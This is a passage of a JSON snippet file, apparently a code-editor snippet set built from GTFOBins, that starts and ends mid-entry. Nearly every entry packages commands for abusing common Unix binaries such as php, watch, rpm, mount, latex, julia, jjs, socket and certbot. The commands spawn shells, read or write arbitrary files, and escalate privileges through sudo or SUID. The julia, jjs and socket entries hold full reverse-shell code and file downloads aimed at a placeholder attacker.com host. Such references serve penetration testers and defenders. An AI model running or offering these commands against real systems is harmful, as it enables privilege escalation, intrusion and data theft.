            "./php -r \"posix_setuid(0); system('\\$CMD');\"${0}",
            "```"
        ],
        "description": "abuse php with capabilities"
    },
    "php file-read (gtfobins)": {
        "prefix": "php file-read",
        "body": [
            "abuse php with file-read",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "php -r 'readfile(getenv(\"LFILE\"));'${0}",
            "```"
        ],
        "description": "abuse php with file-read"
    },
    "php file-write (gtfobins)": {
        "prefix": "php file-write",
        "body": [
            "abuse php with file-write, write data to a file, filename should be absolute.",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "php -r 'file_put_contents(getenv(\"LFILE\"), \"DATA\");'${0}",
            "```"
        ],
        "description": "abuse php with file-write - write data to a file, filename should be absolute."
    },
    "ksu sudo (gtfobins)": {
        "prefix": "ksu sudo",
        "body": [
            "abuse ksu with sudo",
            "",
            "```sh",
            "sudo ksu -q -e /bin/sh${0}",
            "```"
        ],
        "description": "abuse ksu with sudo"
    },
    "watch shell (gtfobins)": {
        "prefix": "watch shell",
        "body": [
            "abuse watch with shell",
            "",
            "```sh",
            "watch -x sh -c 'reset; exec sh 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse watch with shell"
    },
    "watch suid (gtfobins)": {
        "prefix": "watch suid",
        "body": [
            "abuse watch with suid, This keeps the SUID privileges only if the `-x` option is present.",
            "",
            "```sh",
            "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse watch with suid - This keeps the SUID privileges only if the `-x` option is present."
    },
    "watch sudo (gtfobins)": {
        "prefix": "watch sudo",
        "body": [
            "abuse watch with sudo",
            "",
            "```sh",
            "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse watch with sudo"
    },
    "watch limited-suid (gtfobins)": {
        "prefix": "watch limited-suid",
        "body": [
            "abuse watch with limited-suid",
            "",
            "```sh",
            "./watch 'reset; exec sh 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse watch with limited-suid"
    },
    "rpm shell (gtfobins)": {
        "prefix": "rpm shell",
        "body": [
            "abuse rpm with shell",
            "",
            "```sh",
            "rpm --pipe '/bin/sh 0<&1'${0}",
            "```"
        ],
        "description": "abuse rpm with shell"
    },
    "rpm limited-suid (gtfobins)": {
        "prefix": "rpm limited-suid",
        "body": [
            "abuse rpm with limited-suid",
            "",
            "```sh",
            "./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse rpm with limited-suid"
    },
    "rpm sudo (gtfobins)": {
        "prefix": "rpm sudo",
        "body": [
            "abuse rpm with sudo, \nIt runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\n```\n",
            "",
            "```sh",
            "sudo rpm -ivh x-1.0-1.noarch.rpm${0}",
            "```"
        ],
        "description": "abuse rpm with sudo - \nIt runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\n```\n"
    },
    "install suid (gtfobins)": {
        "prefix": "install suid",
        "body": [
            "abuse install with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "TF=\\$(mktemp)",
            "./install -m 6777 \\$LFILE \\$TF${0}",
            "```"
        ],
        "description": "abuse install with suid"
    },
    "install sudo (gtfobins)": {
        "prefix": "install sudo",
        "body": [
            "abuse install with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "TF=\\$(mktemp)",
            "sudo install -m 6777 \\$LFILE \\$TF${0}",
            "```"
        ],
        "description": "abuse install with sudo"
    },
    "zathura shell (gtfobins)": {
        "prefix": "zathura shell",
        "body": [
            "abuse zathura with shell",
            "",
            "```sh",
            "zathura",
            ":! /bin/sh -c 'exec /bin/sh 0<&1'${0}",
            "```"
        ],
        "description": "abuse zathura with shell"
    },
    "zathura sudo (gtfobins)": {
        "prefix": "zathura sudo",
        "body": [
            "abuse zathura with sudo",
            "",
            "```sh",
            "sudo zathura",
            ":! /bin/sh -c 'exec /bin/sh 0<&1'${0}",
            "```"
        ],
        "description": "abuse zathura with sudo"
    },
    "rlwrap shell (gtfobins)": {
        "prefix": "rlwrap shell",
        "body": [
            "abuse rlwrap with shell",
            "",
            "```sh",
            "rlwrap /bin/sh${0}",
            "```"
        ],
        "description": "abuse rlwrap with shell"
    },
    "rlwrap file-write (gtfobins)": {
        "prefix": "rlwrap file-write",
        "body": [
            "abuse rlwrap with file-write, This adds timestamps to the output file. This relies on the external `echo` command.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "rlwrap -l \"\\$LFILE\" echo DATA${0}",
            "```"
        ],
        "description": "abuse rlwrap with file-write - This adds timestamps to the output file. This relies on the external `echo` command."
    },
    "rlwrap suid (gtfobins)": {
        "prefix": "rlwrap suid",
        "body": [
            "abuse rlwrap with suid",
            "",
            "```sh",
            "./rlwrap -H /dev/null /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse rlwrap with suid"
    },
    "rlwrap sudo (gtfobins)": {
        "prefix": "rlwrap sudo",
        "body": [
            "abuse rlwrap with sudo",
            "",
            "```sh",
            "sudo rlwrap /bin/sh${0}",
            "```"
        ],
        "description": "abuse rlwrap with sudo"
    },
    "basenc file-read (gtfobins)": {
        "prefix": "basenc file-read",
        "body": [
            "abuse basenc with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "basenc --base64 \\$LFILE | basenc -d --base64${0}",
            "```"
        ],
        "description": "abuse basenc with file-read"
    },
    "basenc suid (gtfobins)": {
        "prefix": "basenc suid",
        "body": [
            "abuse basenc with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "basenc --base64 \\$LFILE | basenc -d --base64${0}",
            "```"
        ],
        "description": "abuse basenc with suid"
    },
    "basenc sudo (gtfobins)": {
        "prefix": "basenc sudo",
        "body": [
            "abuse basenc with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo basenc --base64 \\$LFILE | basenc -d --base64${0}",
            "```"
        ],
        "description": "abuse basenc with sudo"
    },
    "mount sudo (gtfobins)": {
        "prefix": "mount sudo",
        "body": [
            "abuse mount with sudo, Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell.",
            "",
            "```sh",
            "sudo mount -o bind /bin/sh /bin/mount",
            "sudo mount${0}",
            "```"
        ],
        "description": "abuse mount with sudo - Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell."
    },
    "highlight file-read (gtfobins)": {
        "prefix": "highlight file-read",
        "body": [
            "abuse highlight with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "highlight --no-doc --failsafe \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse highlight with file-read"
    },
    "highlight suid (gtfobins)": {
        "prefix": "highlight suid",
        "body": [
            "abuse highlight with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./highlight --no-doc --failsafe \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse highlight with suid"
    },
    "highlight sudo (gtfobins)": {
        "prefix": "highlight sudo",
        "body": [
            "abuse highlight with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo highlight --no-doc --failsafe \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse highlight with sudo"
    },
    "timedatectl shell (gtfobins)": {
        "prefix": "timedatectl shell",
        "body": [
            "abuse timedatectl with shell",
            "",
            "```sh",
            "timedatectl list-timezones",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse timedatectl with shell"
    },
    "timedatectl sudo (gtfobins)": {
        "prefix": "timedatectl sudo",
        "body": [
            "abuse timedatectl with sudo",
            "",
            "```sh",
            "sudo timedatectl list-timezones",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse timedatectl with sudo"
    },
    "dmsetup sudo (gtfobins)": {
        "prefix": "dmsetup sudo",
        "body": [
            "abuse dmsetup with sudo",
            "",
            "```sh",
            "sudo dmsetup create base <<EOF",
            "0 3534848 linear /dev/loop0 94208",
            "EOF",
            "sudo dmsetup ls --exec '/bin/sh -s'${0}",
            "```"
        ],
        "description": "abuse dmsetup with sudo"
    },
    "dmsetup suid (gtfobins)": {
        "prefix": "dmsetup suid",
        "body": [
            "abuse dmsetup with suid",
            "",
            "```sh",
            "./dmsetup create base <<EOF",
            "0 3534848 linear /dev/loop0 94208",
            "EOF",
            "./dmsetup ls --exec '/bin/sh -p -s'${0}",
            "```"
        ],
        "description": "abuse dmsetup with suid"
    },
    "ansible-playbook shell (gtfobins)": {
        "prefix": "ansible-playbook shell",
        "body": [
            "abuse ansible-playbook with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >\\$TF",
            "ansible-playbook \\$TF${0}",
            "```"
        ],
        "description": "abuse ansible-playbook with shell"
    },
    "ansible-playbook sudo (gtfobins)": {
        "prefix": "ansible-playbook sudo",
        "body": [
            "abuse ansible-playbook with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >\\$TF",
            "sudo ansible-playbook \\$TF${0}",
            "```"
        ],
        "description": "abuse ansible-playbook with sudo"
    },
    "xz file-read (gtfobins)": {
        "prefix": "xz file-read",
        "body": [
            "abuse xz with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xz -c \"\\$LFILE\" | xz -d${0}",
            "```"
        ],
        "description": "abuse xz with file-read"
    },
    "xz suid (gtfobins)": {
        "prefix": "xz suid",
        "body": [
            "abuse xz with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./xz -c \"\\$LFILE\" | xz -d${0}",
            "```"
        ],
        "description": "abuse xz with suid"
    },
    "xz sudo (gtfobins)": {
        "prefix": "xz sudo",
        "body": [
            "abuse xz with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo xz -c \"\\$LFILE\" | xz -d${0}",
            "```"
        ],
        "description": "abuse xz with sudo"
    },
    "enscript shell (gtfobins)": {
        "prefix": "enscript shell",
        "body": [
            "abuse enscript with shell",
            "",
            "```sh",
            "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'${0}",
            "```"
        ],
        "description": "abuse enscript with shell"
    },
    "enscript sudo (gtfobins)": {
        "prefix": "enscript sudo",
        "body": [
            "abuse enscript with sudo",
            "",
            "```sh",
            "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'${0}",
            "```"
        ],
        "description": "abuse enscript with sudo"
    },
    "ex shell (gtfobins)": {
        "prefix": "ex shell",
        "body": [
            "abuse ex with shell",
            "",
            "```sh",
            "ex",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ex with shell"
    },
    "ex file-write (gtfobins)": {
        "prefix": "ex file-write",
        "body": [
            "abuse ex with file-write",
            "",
            "```sh",
            "ex ${1:file_to_write}",
            "a",
            "DATA",
            ".",
            "w",
            "q${0}",
            "```"
        ],
        "description": "abuse ex with file-write"
    },
    "ex file-read (gtfobins)": {
        "prefix": "ex file-read",
        "body": [
            "abuse ex with file-read",
            "",
            "```sh",
            "ex ${1:file_to_read}",
            ",p",
            "q${0}",
            "```"
        ],
        "description": "abuse ex with file-read"
    },
    "ex sudo (gtfobins)": {
        "prefix": "ex sudo",
        "body": [
            "abuse ex with sudo",
            "",
            "```sh",
            "sudo ex",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ex with sudo"
    },
    "jtag shell (gtfobins)": {
        "prefix": "jtag shell",
        "body": [
            "abuse jtag with shell",
            "",
            "```sh",
            "jtag --interactive",
            "shell /bin/sh${0}",
            "```"
        ],
        "description": "abuse jtag with shell"
    },
    "jtag sudo (gtfobins)": {
        "prefix": "jtag sudo",
        "body": [
            "abuse jtag with sudo",
            "",
            "```sh",
            "sudo jtag --interactive",
            "shell /bin/sh${0}",
            "```"
        ],
        "description": "abuse jtag with sudo"
    },
    "stdbuf shell (gtfobins)": {
        "prefix": "stdbuf shell",
        "body": [
            "abuse stdbuf with shell",
            "",
            "```sh",
            "stdbuf -i0 /bin/sh${0}",
            "```"
        ],
        "description": "abuse stdbuf with shell"
    },
    "stdbuf suid (gtfobins)": {
        "prefix": "stdbuf suid",
        "body": [
            "abuse stdbuf with suid",
            "",
            "```sh",
            "./stdbuf -i0 /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse stdbuf with suid"
    },
    "stdbuf sudo (gtfobins)": {
        "prefix": "stdbuf sudo",
        "body": [
            "abuse stdbuf with sudo",
            "",
            "```sh",
            "sudo stdbuf -i0 /bin/sh${0}",
            "```"
        ],
        "description": "abuse stdbuf with sudo"
    },
    "latex shell (gtfobins)": {
        "prefix": "latex shell",
        "body": [
            "abuse latex with shell",
            "",
            "```sh",
            "latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse latex with shell"
    },
    "latex file-read (gtfobins)": {
        "prefix": "latex file-read",
        "body": [
            "abuse latex with file-read, The read file will be part of the output.",
            "",
            "```sh",
            "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{${1:file_to_read}}\\end{document}'",
            "strings article.dvi${0}",
            "```"
        ],
        "description": "abuse latex with file-read - The read file will be part of the output."
    },
    "latex sudo (gtfobins)": {
        "prefix": "latex sudo",
        "body": [
            "abuse latex with sudo",
            "",
            "```sh",
            "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse latex with sudo"
    },
    "latex limited-suid (gtfobins)": {
        "prefix": "latex limited-suid",
        "body": [
            "abuse latex with limited-suid",
            "",
            "```sh",
            "./latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse latex with limited-suid"
    },
    "julia shell (gtfobins)": {
        "prefix": "julia shell",
        "body": [
            "abuse julia with shell",
            "",
            "```sh",
            "julia -e 'run(`/bin/sh`)'${0}",
            "```"
        ],
        "description": "abuse julia with shell"
    },
    "julia file-read (gtfobins)": {
        "prefix": "julia file-read",
        "body": [
            "abuse julia with file-read",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "julia -e 'print(open(f->read(f, String), ENV[\"LFILE\"]))'${0}",
            "```"
        ],
        "description": "abuse julia with file-read"
    },
    "julia file-write (gtfobins)": {
        "prefix": "julia file-write",
        "body": [
            "abuse julia with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "julia -e 'open(f->write(f, \"DATA\"), ENV[\"LFILE\"], \"w\")'${0}",
            "```"
        ],
        "description": "abuse julia with file-write"
    },
    "julia file-download (gtfobins)": {
        "prefix": "julia file-download",
        "body": [
            "abuse julia with file-download",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "julia -e 'download(ENV[\"URL\"], ENV[\"LFILE\"])'${0}",
            "```"
        ],
        "description": "abuse julia with file-download"
    },
    "julia reverse-shell (gtfobins)": {
        "prefix": "julia reverse-shell",
        "body": [
            "abuse julia with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "julia -e 'using Sockets; sock=connect(ENV[\"RHOST\"], parse(Int64,ENV[\"RPORT\"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`\\$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'${0}",
            "```"
        ],
        "description": "abuse julia with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "julia suid (gtfobins)": {
        "prefix": "julia suid",
        "body": [
            "abuse julia with suid",
            "",
            "```sh",
            "./julia -e 'run(`/bin/sh -p`)'${0}",
            "```"
        ],
        "description": "abuse julia with suid"
    },
    "julia sudo (gtfobins)": {
        "prefix": "julia sudo",
        "body": [
            "abuse julia with sudo",
            "",
            "```sh",
            "sudo julia -e 'run(`/bin/sh`)'${0}",
            "```"
        ],
        "description": "abuse julia with sudo"
    },
    "hexdump file-read (gtfobins)": {
        "prefix": "hexdump file-read",
        "body": [
            "abuse hexdump with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "hexdump -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hexdump with file-read"
    },
    "hexdump suid (gtfobins)": {
        "prefix": "hexdump suid",
        "body": [
            "abuse hexdump with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./hexdump -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hexdump with suid"
    },
    "hexdump sudo (gtfobins)": {
        "prefix": "hexdump sudo",
        "body": [
            "abuse hexdump with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo hexdump -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hexdump with sudo"
    },
    "ed shell (gtfobins)": {
        "prefix": "ed shell",
        "body": [
            "abuse ed with shell",
            "",
            "```sh",
            "ed",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ed with shell"
    },
    "ed file-write (gtfobins)": {
        "prefix": "ed file-write",
        "body": [
            "abuse ed with file-write",
            "",
            "```sh",
            "ed ${1:file_to_write}",
            "a",
            "DATA",
            ".",
            "w",
            "q${0}",
            "```"
        ],
        "description": "abuse ed with file-write"
    },
    "ed file-read (gtfobins)": {
        "prefix": "ed file-read",
        "body": [
            "abuse ed with file-read",
            "",
            "```sh",
            "ed ${1:file_to_read}",
            ",p",
            "q${0}",
            "```"
        ],
        "description": "abuse ed with file-read"
    },
    "ed suid (gtfobins)": {
        "prefix": "ed suid",
        "body": [
            "abuse ed with suid",
            "",
            "```sh",
            "./ed ${1:file_to_read}",
            ",p",
            "q${0}",
            "```"
        ],
        "description": "abuse ed with suid"
    },
    "ed sudo (gtfobins)": {
        "prefix": "ed sudo",
        "body": [
            "abuse ed with sudo",
            "",
            "```sh",
            "sudo ed",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ed with sudo"
    },
    "ed limited-suid (gtfobins)": {
        "prefix": "ed limited-suid",
        "body": [
            "abuse ed with limited-suid",
            "",
            "```sh",
            "./ed",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ed with limited-suid"
    },
    "paste file-read (gtfobins)": {
        "prefix": "paste file-read",
        "body": [
            "abuse paste with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "paste \\$LFILE${0}",
            "```"
        ],
        "description": "abuse paste with file-read"
    },
    "paste suid (gtfobins)": {
        "prefix": "paste suid",
        "body": [
            "abuse paste with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "paste \\$LFILE${0}",
            "```"
        ],
        "description": "abuse paste with suid"
    },
    "paste sudo (gtfobins)": {
        "prefix": "paste sudo",
        "body": [
            "abuse paste with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo paste \\$LFILE${0}",
            "```"
        ],
        "description": "abuse paste with sudo"
    },
    "msgconv file-read (gtfobins)": {
        "prefix": "msgconv file-read",
        "body": [
            "abuse msgconv with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msgconv -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgconv with file-read"
    },
    "msgconv sudo (gtfobins)": {
        "prefix": "msgconv sudo",
        "body": [
            "abuse msgconv with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo msgconv -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgconv with sudo"
    },
    "msgconv suid (gtfobins)": {
        "prefix": "msgconv suid",
        "body": [
            "abuse msgconv with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./msgconv -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgconv with suid"
    },
    "multitime shell (gtfobins)": {
        "prefix": "multitime shell",
        "body": [
            "abuse multitime with shell",
            "",
            "```sh",
            "multitime /bin/sh${0}",
            "```"
        ],
        "description": "abuse multitime with shell"
    },
    "multitime suid (gtfobins)": {
        "prefix": "multitime suid",
        "body": [
            "abuse multitime with suid",
            "",
            "```sh",
            "./multitime /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse multitime with suid"
    },
    "multitime sudo (gtfobins)": {
        "prefix": "multitime sudo",
        "body": [
            "abuse multitime with sudo",
            "",
            "```sh",
            "sudo multitime /bin/sh${0}",
            "```"
        ],
        "description": "abuse multitime with sudo"
    },
    "socket reverse-shell (gtfobins)": {
        "prefix": "socket reverse-shell",
        "body": [
            "abuse socket with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "socket -qvp '/bin/sh -i' \\$RHOST \\$RPORT${0}",
            "```"
        ],
        "description": "abuse socket with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "socket bind-shell (gtfobins)": {
        "prefix": "socket bind-shell",
        "body": [
            "abuse socket with bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "socket -svp '/bin/sh -i' \\$LPORT${0}",
            "```"
        ],
        "description": "abuse socket with bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "script shell (gtfobins)": {
        "prefix": "script shell",
        "body": [
            "abuse script with shell",
            "",
            "```sh",
            "script -q /dev/null${0}",
            "```"
        ],
        "description": "abuse script with shell"
    },
    "script sudo (gtfobins)": {
        "prefix": "script sudo",
        "body": [
            "abuse script with sudo",
            "",
            "```sh",
            "sudo script -q /dev/null${0}",
            "```"
        ],
        "description": "abuse script with sudo"
    },
    "script file-write (gtfobins)": {
        "prefix": "script file-write",
        "body": [
            "abuse script with file-write, The wrote content is corrupted by debug prints.",
            "",
            "```sh",
            "script -q -c 'echo DATA' ${1:file_to_write}${0}",
            "```"
        ],
        "description": "abuse script with file-write - The wrote content is corrupted by debug prints."
    },
    "agetty suid (gtfobins)": {
        "prefix": "agetty suid",
        "body": [
            "abuse agetty with suid",
            "",
            "```sh",
            "./agetty -o -p -l /bin/sh -a root tty${0}",
            "```"
        ],
        "description": "abuse agetty with suid"
    },
    "check_log file-read (gtfobins)": {
        "prefix": "check_log file-read",
        "body": [
            "abuse check_log with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "OUTPUT=output_file",
            "check_log -F \\$LFILE -O \\$OUTPUT",
            "cat \\$OUTPUT${0}",
            "```"
        ],
        "description": "abuse check_log with file-read"
    },
    "check_log file-write (gtfobins)": {
        "prefix": "check_log file-write",
        "body": [
            "abuse check_log with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "INPUT=input_file",
            "check_log -F \\$INPUT -O \\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_log with file-write"
    },
    "check_log sudo (gtfobins)": {
        "prefix": "check_log sudo",
        "body": [
            "abuse check_log with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "INPUT=input_file",
            "sudo check_log -F \\$INPUT -O \\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_log with sudo"
    },
    "base32 file-read (gtfobins)": {
        "prefix": "base32 file-read",
        "body": [
            "abuse base32 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "base32 \"\\$LFILE\" | base32 --decode${0}",
            "```"
        ],
        "description": "abuse base32 with file-read"
    },
    "base32 suid (gtfobins)": {
        "prefix": "base32 suid",
        "body": [
            "abuse base32 with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "base32 \"\\$LFILE\" | base32 --decode${0}",
            "```"
        ],
        "description": "abuse base32 with suid"
    },
    "base32 sudo (gtfobins)": {
        "prefix": "base32 sudo",
        "body": [
            "abuse base32 with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo base32 \"\\$LFILE\" | base32 --decode${0}",
            "```"
        ],
        "description": "abuse base32 with sudo"
    },
    "gem shell (gtfobins)": {
        "prefix": "gem shell",
        "body": [
            "abuse gem with shell, This executes the specified file as [`ruby`](/gtfobins/ruby/) code.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'system(\"/bin/sh\")' > \\$TF/x",
            "gem install --file \\$TF/x${0}",
            "```"
        ],
        "description": "abuse gem with shell - This executes the specified file as [`ruby`](/gtfobins/ruby/) code."
    },
    "gem sudo (gtfobins)": {
        "prefix": "gem sudo",
        "body": [
            "abuse gem with sudo, This requires the name of an installed gem to be provided (`rdoc` is usually installed).",
            "",
            "```sh",
            "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc${0}",
            "```"
        ],
        "description": "abuse gem with sudo - This requires the name of an installed gem to be provided (`rdoc` is usually installed)."
    },
    "certbot shell (gtfobins)": {
        "prefix": "certbot shell",
        "body": [
            "abuse certbot with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir \\$TF --work-dir \\$TF --config-dir \\$TF --pre-hook '/bin/sh 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse certbot with shell"
    },
    "certbot sudo (gtfobins)": {
        "prefix": "certbot sudo",
        "body": [
            "abuse certbot with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir \\$TF --work-dir \\$TF --config-dir \\$TF --pre-hook '/bin/sh 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse certbot with sudo"
    },
    "jjs shell (gtfobins)": {
        "prefix": "jjs shell",
        "body": [
            "abuse jjs with shell",
            "",
            "```sh",
            "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\\\$@|sh _ echo sh <\\$(tty) >\\$(tty) 2>\\$(tty)').waitFor()\" | jjs${0}",
            "```"
        ],
        "description": "abuse jjs with shell"
    },
    "jjs reverse-shell (gtfobins)": {
        "prefix": "jjs reverse-shell",
        "body": [
            "abuse jjs with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "echo 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");",
            "var port=Java.type(\"java.lang.System\").getenv(\"RPORT\");",
            "var ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");",
            "var p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();",
            "var Socket = Java.type(\"java.net.Socket\");",
            "var s=new Socket(host,port);",
            "var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();",
            "var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs${0}",
            "```"
        ],
        "description": "abuse jjs with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "jjs file-download (gtfobins)": {
        "prefix": "jjs file-download",
        "body": [
            "abuse jjs with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "echo \"var URL = Java.type('java.net.URL');",
            "var ws = new URL('\\$URL');",
            "var Channels = Java.type('java.nio.channels.Channels');",
            "var rbc = Channels.newChannel(ws.openStream());",
            "var FileOutputStream = Java.type('java.io.FileOutputStream');",
            "var fos = new FileOutputStream('\\$LFILE');",
            "fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);",
            "fos.close();",
            "rbc.close();\" | jjs${0}",
            "```"
        ],
        "description": "abuse jjs with file-download - Fetch a remote file via HTTP GET request."
    },
    "jjs file-write (gtfobins)": {
        "prefix": "jjs file-write",
        "body": [
            "abuse jjs with file-write",
            "",
            "```sh",
            "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");",
            "var fw=new FileWriter(\"./${1:file_to_write}\");",
            "fw.write(\"DATA\");",
            "fw.close();' | jjs${0}",
            "```"
        ],
        "description": "abuse jjs with file-write"
    },
    "jjs file-read (gtfobins)": {
        "prefix": "jjs file-read",
        "body": [
            "abuse jjs with file-read",
            "",
            "```sh",
            "echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");",
            "var FileReader = Java.type(\"java.io.FileReader\");",
            "var br = new BufferedReader(new FileReader(\"${1:file_to_read}\"));",
            "while ((line = br.readLine()) != null) { print(line); }' | jjs${0}",
            "```"
        ],
        "description": "abuse jjs with file-read"
    },
    "jjs suid (gtfobins)": {
        "prefix": "jjs suid",
        "body": [
            "abuse jjs with suid, This has been found working in macOS but failing on Linux systems.",
            "",
            "```sh",
            "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\\\$@|sh\\${IFS}-p _ echo sh -p <\\$(tty) >\\$(tty) 2>\\$(tty)').waitFor()\" | ./jjs${0}",
            "```"
        ],
